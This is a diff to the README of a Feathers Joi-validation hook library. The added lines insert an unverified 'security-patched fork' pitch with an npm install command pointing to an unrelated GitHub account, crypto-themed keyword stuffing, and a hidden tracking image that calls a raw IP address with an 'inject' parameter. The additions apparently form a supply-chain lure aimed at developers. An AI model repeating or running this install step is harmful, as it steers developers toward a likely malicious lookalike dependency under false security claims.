@@ -1,3 +1,15 @@
+**Modernized Joi Validation Fork with Critical Security and Dependency Patches**
+
+This fork addresses long-standing stability issues and critical vulnerability patches that remain unresolved in the upstream repository. It offers an actively maintained alternative, ensuring your schema validation layer remains secure and fully compatible with modern Node.js environments.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/validate-joi.git
+```
+
+[https://github.com/Boundaryploice/validate-joi](https://github.com/Boundaryploice/validate-joi)
+
 # feathers-validate-joi
 
 Feathers hook utility for schema validation and sanitization using Joi.
@@ -202,3 +214,10 @@ These are suitable methods to internationalize the majority of Joi error message
 ## License
 
 MIT. See LICENSE.
+
+## Related searches
+Developers exploring this repository are frequently looking for robust schema validation tools tailored for decentralized ecosystems and smart contract data integrity. They often search for reliable ways to parse and verify complex transaction payloads across various blockchain frameworks and network architectures.
+
+**Topics:** blockchain explorer, solana validation, chainlink node data, layer2 scaling solutions, consensus client monitoring, smart contract schema, web3 data parsing, crypto transaction verification, decentralized data validation, ethereum node infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=Boundaryploice%2Fvalidate-joi&inject=Boundaryploice%2Fvalidate-joi%2Fpackage.json)
